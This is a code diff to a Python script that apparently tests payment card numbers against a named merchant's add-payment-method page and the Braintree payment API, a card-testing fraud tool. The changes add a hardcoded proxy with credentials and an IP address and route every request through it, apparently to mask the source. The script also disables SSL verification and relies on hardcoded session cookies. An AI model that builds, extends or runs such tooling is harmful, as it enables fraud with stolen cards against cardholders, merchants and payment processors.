@@ -12,6 +12,12 @@ import os
 # Disable SSL warnings
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
+# Proxy configuration
+proxies = {
+    'http': 'http://25chilna:password@209.174.185.196:6226',
+    'https': 'http://25chilna:password@209.174.185.196:6226'
+}
+
 # Provided cookies and headers
 cookies = {
     'ccid.90027420': '338975451.4479194007',
@@ -146,7 +152,7 @@ def check_card(cc_line):
     try:
         domain_url = "https://www.calipercovers.com"
         
-        # Get fresh authorization tokens with proper timeouts
+        # Get fresh authorization tokens with proxy support
         headers_get = headers.copy()
         headers_get['accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'
         headers_get['referer'] = f'{domain_url}/my-account/payment-methods/'
@@ -155,6 +161,7 @@ def check_card(cc_line):
             f'{domain_url}/my-account/add-payment-method/',
             cookies=cookies,
             headers=headers_get,
+            proxies=proxies,
             verify=False,
             timeout=10  # 10 second timeout
         )
@@ -243,6 +250,7 @@ def check_card(cc_line):
             'https://payments.braintree-api.com/graphql',
             headers=headers_token,
             json=json_data,
+            proxies=proxies,
             verify=False,
             timeout=15  # 15 second timeout
         )
@@ -275,6 +283,7 @@ def check_card(cc_line):
                         cookies=cookies,
                         headers=headers_submit,
                         data=data,
+                        proxies=proxies,
                         verify=False,
                         timeout=20  # 20 second timeout
                     )
